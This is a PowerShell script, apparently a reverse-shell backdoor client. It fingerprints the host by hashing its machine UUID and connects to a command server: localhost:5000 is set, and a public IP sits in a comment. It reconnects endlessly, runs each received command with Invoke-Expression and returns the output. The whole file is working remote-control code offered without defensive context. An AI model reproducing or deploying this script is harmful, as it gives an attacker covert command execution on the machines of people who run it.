# Get UUID of Windows machine. Random bytes for Linux.
try {
    $uuid = [System.Text.Encoding]::UTF8.GetBytes((Get-WMIObject Win32_ComputerSystemProduct).UUID);
} catch [System.Management.Automation.CommandNotFoundException] {
    $uuid = 0;#[System.Text.Encoding]::UTF8.GetBytes((Get-Random));
}

# Compute SHA-256 hash of $uuid.
$hasher = [System.Security.Cryptography.HashAlgorithm]::Create("sha256");
$uuid_hash = $hasher.ComputeHash($uuid);

# Preallocate byte array of sensible size with zeroes.
[byte[]] $bytes = 0..65535 | % {0};

# Try to establish connection indefinitely until "exit" command is issued.
while (1) {

    # Attempt to establish connection to server. Retry every 3 seconds.
    try {
        $client = New-Object System.Net.Sockets.TCPClient("localhost", 5000); # 145.24.222.156", 5000);
    } catch { # Catch ConstructorInvokedThrowException..
        Start-Sleep -s 3;
        continue;
    }

    # Initialize byte stream.
    $stream = $client.GetStream();

    # Send UUID hash as initial message.
    $out = [System.BitConverter]::GetBytes([int64] $uuid_hash.Length) + $uuid_hash;
    $stream.Write($out, 0, $out.Length)
    $stream.Flush();

    # Keep session established.
    while (1) {

        # Read bytes from stream and encode to ASCII.
        $in = $stream.Read($bytes, 0, $bytes.Length);
        $cmd = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $in);

        # Retry in 2 seconds if there was nothing to read.
        if ($cmd -eq "") {
            Start-Sleep -s 2;
            continue;
        }
        # Close socket and exit on "exit" command.
        if ($cmd -eq "exit") {
            $client.Close();
            exit 1;
        }

        # Run command.
        $result = [System.Text.Encoding]::UTF8.GetBytes((iex $cmd 2>&1 | Out-String));

        # Send response.
        $out = [System.BitConverter]::GetBytes([int64] $result.Length) + $result;
        $stream.Write($out, 0, $out.Length);
        $stream.Flush();
    }
}
